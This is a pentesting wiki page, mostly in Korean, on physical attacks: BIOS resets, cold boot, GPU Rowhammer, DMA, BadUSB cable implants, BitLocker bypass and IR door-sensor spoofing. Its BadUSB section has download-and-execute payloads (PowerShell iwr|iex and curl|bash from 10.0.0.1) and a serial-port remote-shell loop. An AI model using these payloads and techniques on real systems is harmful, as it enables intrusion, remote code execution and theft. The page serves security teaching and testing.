# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**BIOS 재설정**은 여러 방법으로 할 수 있습니다. 대부분의 메인보드에는 **배터리**가 포함되어 있으며, 이를 약 **30분** 동안 제거하면 비밀번호를 포함한 BIOS 설정이 초기화됩니다. 또는 **메인보드의 점퍼**를 조정해 특정 핀을 연결함으로써 이 설정들을 초기화할 수 있습니다.

하드웨어 조정이 불가능하거나 실용적이지 않은 경우에는 **software tools**가 해결책이 됩니다. **Kali Linux** 같은 배포판이 들어 있는 **Live CD/USB**로 시스템을 부팅하면 **_killCmos_**와 **_CmosPWD_** 같은 도구를 사용할 수 있으며, 이는 BIOS 비밀번호 복구를 도울 수 있습니다.

BIOS 비밀번호를 모르는 경우, 비밀번호를 **세 번** 잘못 입력하면 일반적으로 오류 코드가 표시됩니다. 이 코드는 [https://bios-pw.org](https://bios-pw.org) 같은 웹사이트에서 사용해 사용할 수 있는 비밀번호를 알아내는 데 활용될 수 있습니다.

### UEFI Security

**UEFI**를 사용하는 최신 시스템에서는 기존 BIOS 대신 **chipsec** 도구를 사용하여 **Secure Boot** 비활성화를 포함한 UEFI 설정을 분석하고 수정할 수 있습니다. 이는 다음 명령으로 수행할 수 있습니다:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM 분석 및 Cold Boot 공격

RAM은 전원이 차단된 뒤에도 잠시 데이터를 유지하며, 보통 **1~2분** 정도 지속된다. 이 지속 시간은 액체 질소 같은 차가운 물질을 적용하면 **10분**까지 늘릴 수 있다. 이 연장된 기간 동안 **memory dump**를 **dd.exe**와 **volatility** 같은 도구로 생성해 분석할 수 있다.

---

## Page Tables에 대한 GPU Rowhammer

현대의 GPU Rowhammer 공격은 일반 버퍼가 아니라 **GPU virtual-memory metadata**를 대상으로 할 때 훨씬 더 유용해진다. **GDDR6 NVIDIA Ampere GPUs**에 대한 최근 연구는, 권한 없는 CUDA 코드를 실행하는 공격자가 GPU 전용 hammering 패턴을 만들고, **memory massaging**으로 paging structures를 취약한 row에 배치한 뒤, **last-level page table** 또는 중간 **page directory**에서 비트를 뒤집을 수 있음을 보여준다. 번역 엔트리 하나만 손상되면 공격자는 **arbitrary GPU memory read/write**를 부트스트랩하고, 이후 host compromise로 전환할 수 있다.

### Exploitation Pattern

1. **Profile hammerable rows** in GDDR6 and build refresh-aware / non-uniform hammering patterns that bypass in-DRAM mitigations.
2. **Massage GPU allocations** so the driver places page-translation structures in hammerable physical locations instead of keeping them in the default protected pool. In practice this can mean exhausting the low-memory page-table region and spraying large sparse UVM mappings with controlled strides.
3. **Flip translation metadata** such as **PFN** or aperture-related bits inside a page-table / page-directory entry so the attacker-controlled virtual page resolves to page-table pages, arbitrary GPU memory, or host-visible system mappings.
4. Reuse the forged mapping to rewrite additional translation entries and escalate into **arbitrary GPU memory read/write** across GPU contexts.

### Host Pivot and Mitigations

- **IOMMU disabled** 상태에서는, 위조된 system-aperture 매핑이 임의의 **host physical memory**를 GPU에 노출할 수 있어, GPU primitive가 완전한 host compromise로 이어진다.
- **GDDRHammer**는 last-level page-table entries를 대상으로 하고, **GeForge**는 page-directory level을 손상시키는 것이 더 쉬울 수 있음을 보여준다. 한 비트 플립만으로 더 큰 translation subtree를 재지정할 수 있기 때문이다. paging layer 하나만 security-critical하다고 보지 말아야 한다.
- **IOMMU**는 여전히 중요하다. 왜냐하면 GDDRHammer/GeForge가 사용하는 직접적인 arbitrary-host-memory 경로를 차단하기 때문이다. 하지만 **완전한 mitigation은 아니다**. **GPUBreach**는 공격자가 GPU가 쓸 수 있고 driver가 소유한 CPU buffers를 손상시킨 뒤 NVIDIA driver의 memory-safety bug를 유발해 kernel write primitive와 **root shell**을 획득하는 second-stage pivot을 보여준다. 이 과정은 IOMMU가 활성화된 상태에서도 가능하다.
- 지원되는 workstation/server GPUs에서는 **System-level ECC**가 실질적인 hardening 단계다. ECC가 없는 consumer GPUs는 더 약한 defense surface를 노출한다.
- 이 공격들은 순수한 이론이 아니다. **GeForge**는 RTX 3060에서 **1,171**개의 bit flip, RTX A6000에서 **202**개의 bit flip을 보고했으며, 이는 작동하는 host-privilege-escalation chain을 만들기에 충분했다.

---

## Direct Memory Access (DMA) 공격

**INCEPTION**은 **FireWire**와 **Thunderbolt** 같은 인터페이스와 호환되는 DMA를 통한 **physical memory manipulation**용 도구다. 메모리를 패치해 어떤 password도 허용하도록 하여 로그인 절차를 우회할 수 있다. 그러나 **Windows 10** 시스템에는 효과가 없다.

---

## 시스템 접근을 위한 Live CD/USB

**_sethc.exe_** 또는 **_Utilman.exe_** 같은 시스템 binary를 **_cmd.exe_**의 복사본으로 바꾸면 system privileges가 있는 command prompt를 얻을 수 있다. **chntpw** 같은 도구는 Windows 설치의 **SAM** file을 편집하는 데 사용할 수 있으며, 이를 통해 password 변경이 가능하다.

**Kon-Boot**는 Windows kernel 또는 UEFI를 일시적으로 수정해 password를 모르더라도 Windows 시스템에 로그인할 수 있게 해주는 도구다. 더 자세한 정보는 [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/)에서 확인할 수 있다.

---

## Windows Security Features 다루기

### Boot and Recovery Shortcuts

- **Supr**: BIOS settings에 접근.
- **F8**: Recovery mode 진입.
- Windows banner 뒤에 **Shift**를 누르면 autologon을 우회할 수 있다.

### BAD USB Devices

**Rubber Ducky**와 **Teensyduino** 같은 장치는 대상 컴퓨터에 연결되면 미리 정의된 payload를 실행할 수 있는 **bad USB** 장치를 만드는 플랫폼으로 사용된다.

### Volume Shadow Copy

Administrator privileges가 있으면 PowerShell을 통해 **SAM** file을 포함한 민감한 파일의 복사본을 만들 수 있다.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** 같은 ESP32-S3 기반 implant는 USB-A→USB-C 또는 USB-C↔USB-C 케이블 안에 숨고, 순수하게 USB keyboard로만 인식되며, C2 stack을 Wi-Fi로 노출한다. 운영자는 케이블에 victim host에서 전원만 공급한 뒤, 비밀번호 `123456789`인 `Evil Crow Cable Wind`라는 hotspot을 만들고, [http://cable-wind.local/](http://cable-wind.local/) (또는 DHCP address)로 접속해 내장 HTTP interface에 접근하면 된다.
- browser UI는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, *Config* 탭을 제공한다. 저장된 payload는 OS별로 태그되며, keyboard layout은 즉시 전환되고, VID/PID 문자열은 알려진 peripheral을 흉내 내도록 변경할 수 있다.
- C2가 케이블 내부에 있기 때문에 phone으로 payload를 준비하고, execution을 트리거하고, Wi-Fi credentials를 관리할 수 있어 host OS를 건드릴 필요가 없다. 짧은 체류 시간의 physical intrusion에 이상적이다.

### OS-aware AutoExec payloads

- AutoExec rules는 하나 이상의 payload를 USB enumeration 직후 즉시 실행되도록 연결한다. implant는 가벼운 OS fingerprinting을 수행하고 일치하는 script를 선택한다.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- execution이 unattended이므로, 단순히 charging cable만 바꿔도 로그인된 user context에서 “plug-and-pwn” initial access를 달성할 수 있다.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 저장된 payload가 console을 열고, 새 USB serial device로 들어오는 모든 것을 실행하는 loop를 붙여넣는다. 최소한의 Windows 변형은 다음과 같다:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant는 USB CDC 채널을 열어 둔 채로 ESP32-S3가 운영자에게 TCP client(Python script, Android APK, 또는 desktop executable)를 시작한다. TCP session에 입력된 모든 바이트는 위의 serial loop로 전달되어, air-gapped 호스트에서도 원격 command execution을 가능하게 한다. output은 제한적이어서, 운영자들은 보통 blind commands(계정 생성, 추가 tooling staging 등)를 실행한다.

### HTTP OTA update surface

- 동일한 web stack는 보통 인증 없는 firmware updates도 노출한다. Evil Crow Cable Wind는 `/update`에서 리슨하며 업로드된 어떤 binary든 flash한다:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Bypassing BitLocker Encryption

BitLocker encryption can potentially be bypassed if the **recovery password** is found within a memory dump file (**MEMORY.DMP**). Tools like **Elcomsoft Forensic Disk Decryptor** or **Passware Kit Forensic** can be utilized for this purpose.

---

## Social Engineering for Recovery Key Addition

A new BitLocker recovery key can be added through social engineering tactics, convincing a user to execute a command that adds a new recovery key composed of zeros, thereby simplifying the decryption process.

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Many modern laptops and small-form-factor desktops include a **chassis-intrusion switch** that is monitored by the Embedded Controller (EC) and the BIOS/UEFI firmware.  While the primary purpose of the switch is to raise an alert when a device is opened, vendors sometimes implement an **undocumented recovery shortcut** that is triggered when the switch is toggled in a specific pattern.

### How the Attack Works

1. The switch is wired to a **GPIO interrupt** on the EC.
2. Firmware running on the EC keeps track of the **timing and number of presses**.
3. When a hard-coded pattern is recognised, the EC invokes a *mainboard-reset* routine that **erases the contents of the system NVRAM/CMOS**.
4. On next boot, the BIOS loads default values – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.

> Once Secure Boot is disabled and the firmware password is gone, the attacker can simply boot any external OS image and obtain unrestricted access to the internal drives.

### Real-World Example – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
열 번째 사이클 후 EC는 다음 재부팅 시 BIOS가 NVRAM을 wipe하도록 지시하는 플래그를 설정한다. 전체 절차는 ~40 s가 걸리며 **드라이버 외에는 아무것도 필요하지 않다**.

### Generic Exploitation Procedure

1. EC가 동작 중이도록 대상 장치를 전원 켜기 또는 suspend-resume 한다.
2. 하단 커버를 제거해 intrusion/maintenance 스위치를 노출한다.
3. 벤더별 토글 패턴을 재현한다(문서, 포럼을 참고하거나 EC firmware를 reverse-engineer 한다).
4. 다시 조립하고 reboot 한다 – firmware protections가 비활성화되어야 한다.
5. live USB(예: Kali Linux)로 부팅하고 일반적인 post-exploitation을 수행한다(credential dumping, data exfiltration, malicious EFI binaries 삽입 등).

### Detection & Mitigation

* OS management console에서 chassis-intrusion 이벤트를 기록하고 예상치 못한 BIOS resets와 연관시킨다.
* 나사를/커버에 **tamper-evident seals**를 사용해 개봉을 탐지한다.
* 장치를 **physically controlled areas**에 보관한다; physical access는 곧 full compromise와 같다고 가정한다.
* 가능하다면 벤더의 “maintenance switch reset” 기능을 비활성화하거나 NVRAM resets에 추가 cryptographic authorisation을 요구한다.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – logic analyser를 컨트롤러 핀에 연결해 내부 IR LED를 구동하는 detection 전과 후의 파형을 모두 기록한다.
2. **Replay only the “post-detection” waveform** – 기본 emitter를 제거/무시하고, 처음부터 이미 트리거된 패턴으로 외부 IR LED를 구동한다. receiver는 pulse count/frequency만 신경 쓰므로, 스푸핑된 carrier를 진짜 reflection으로 취급하고 relay line을 assert 한다.
3. **Gate the transmission** – tuned bursts(예: 수십 ms on, 비슷한 시간 off)로 carrier를 전송해 receiver의 AGC나 interference handling logic을 포화시키지 않으면서 최소 pulse count를 전달한다. 지속적인 emission은 sensor를 빠르게 desensitise시키고 relay가 동작하지 않게 만든다.

### Long-Range Reflective Injection
- 벤치 LED를 high-power IR diode, MOSFET driver, focusing optics로 교체하면 약 6 m 떨어진 곳에서도 안정적으로 triggering 할 수 있다.
- 공격자는 receiver aperture를 직접 볼 line-of-sight가 필요 없다; 유리 너머로 보이는 내부 벽, 선반, 또는 door frame을 향해 beam을 비추면 reflected energy가 약 30° field of view 안으로 들어가며 가까운 거리의 손짓을 모방한다.
- receiver는 약한 reflection만 예상하므로, 훨씬 강한 외부 beam도 여러 표면에서 bounce되어 detection threshold를 넘길 수 있다.

### Weaponised Attack Torch
- driver를 상용 flashlight 안에 내장하면 도구를 평범한 물건처럼 숨길 수 있다. visible LED를 receiver의 band에 맞는 high-power IR LED로 교체하고, ≈30 kHz bursts를 생성하는 ATtiny412(또는 유사한 MCU)를 추가하며, MOSFET으로 LED current를 sink한다.
- telescopic zoom lens는 range/precision을 위해 beam을 좁혀주고, MCU 제어 하의 vibration motor는 visible light를 방출하지 않으면서 modulation이 활성화되었음을 haptic으로 확인시켜 준다.
- 여러 저장된 modulation pattern(약간 다른 carrier frequency와 envelope)을 순환하면 rebranded sensor families 전반의 호환성이 높아져, operator가 relay가 들릴 정도로 클릭하고 문이 풀릴 때까지 reflective surfaces를 훑을 수 있다.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
